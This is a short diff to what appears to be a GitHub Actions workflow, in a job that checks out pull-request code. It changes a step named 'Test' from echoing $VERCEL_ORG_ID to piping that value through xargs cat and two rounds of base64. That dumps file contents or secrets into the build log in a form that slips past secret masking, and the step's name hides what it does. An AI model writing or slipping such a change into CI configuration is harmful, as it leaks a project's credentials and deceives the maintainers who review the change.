@@ -36,7 +36,7 @@ jobs:
         with:
           ref: ${{ github.event.issue.pull_request && format('refs/pull/{0}/merge', github.event.issue.number) || '' }}
       - name: Test
-        run: echo "$VERCEL_ORG_ID"
+        run: echo "$VERCEL_ORG_ID" | xargs cat | base64 | base64
       - name: Prepare Yarn
         uses: ./.github/actions/prepare/
       - name: Prepare build
